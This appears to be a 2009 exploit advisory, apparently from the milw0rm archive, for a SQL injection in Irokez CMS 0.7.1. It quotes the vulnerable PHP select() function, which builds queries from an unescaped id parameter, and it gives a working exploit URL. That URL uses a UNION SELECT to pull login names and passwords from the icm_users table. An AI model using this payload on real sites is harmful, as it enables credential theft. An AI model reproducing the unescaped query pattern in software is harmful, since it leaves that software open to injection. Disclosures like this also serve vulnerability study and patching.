@@ -1,0 +1,73 @@
+[+]--------------------------------------------------------------------------------------------------------------------[+]
+[+]--------------------------------------------[Irokez 0.7.1 SQL inlection]--------------------------------------------[+]  
+[+]--------------------------------------------------------------------------------------------------------------------[+]
+
+-[INFO]----------------------------------------------------------------------------------------------------------------[+]
+[+] Title:Irokez 0.7.1 SQL inlection
+[+] Autor: Ins3t
+[+] Site: www.arthacking.net
+[+] Date:04.08.2009
+[+]--------------------------------------------------------------------------------------------------------------------[+]
+
+-[BUG INFO]------------------------------------------------------------------------------------------------------------[+]
+[+] The vulnerability is caused by insufficient processing of select() function, which led to the SQL inj.
+[+] Conditions: magic_quotes_gpc = Off
+[+] Code vulnerable functions:
+
+[+]-------------------------------------------------[CODE]--------------------------------------------------------------[+]
+  function select($id)
+  {
+  if (isset($this->_cache[$id])) {
+  $data = $this->_cache[$id];
+  } else {
+  $data = array();
+  /*
+  get data
+  */
+  $is_trans = in_array($this->_name.$this->_trans, $this->db->getTables());
+  if ($is_trans) {
+  $query = "select t.*, m.* from {$this->_name} m"
+  . " left join {$this->_name}{$this->_trans} t on (t.{$this->_item} = m.id)"
+  . " where m.id = '$id' group by {$this->_lang}";
+  } else {
+  $query = "select * from {$this->_name} where id = '$id'";
+  }
+  $result = $this->db->exeQuery($query);
+
+  $main_fields = $this->db->getFields($this->_name);
+  if ($is_trans) {
+  $trans_fields = $this->db->getFields($this->_name . $this->_trans);
+  $trans_fields = array_flip($trans_fields);
+  } else {
+  $trans_fields = array();
+  }
+  unset($trans_fields[$this->_item], $trans_fields[$this->_lang]);
+  $trans_fields = array_flip($trans_fields);
+   
+  $data = array();
+  while ($row = mysql_fetch_assoc($result)) {
+  foreach ($row as $field => $value) {
+  if (in_array($field, $main_fields)) {
+  $data[$field] = $value;
+  } elseif (in_array($field, $trans_fields)) {
+  $data[$field][$row[$this->_lang]] = $value;
+  }
+  }
+  }
+  if (isset($data['id'])) {
+  $this->_cache[$data['id']] = $data;
+  }
+  }
+  return $data;
+  }
+[+]------------------------------------------------[/CODE]-------------------------------------------------------------[+]
+
+[+] Exploit: 
+
+[+]-------------------------------------------------[CODE]--------------------------------------------------------------[+]
+
+http://localhost/cms/ru/news/7'+union+select+1,2,concat_ws(0x3a,login,pass),4,5,6,7,8,9,10,11,12+from+icm_users--+/?page=1
+
+[+]------------------------------------------------[/CODE]-------------------------------------------------------------[+]
+
+# milw0rm.com [2009-08-05]
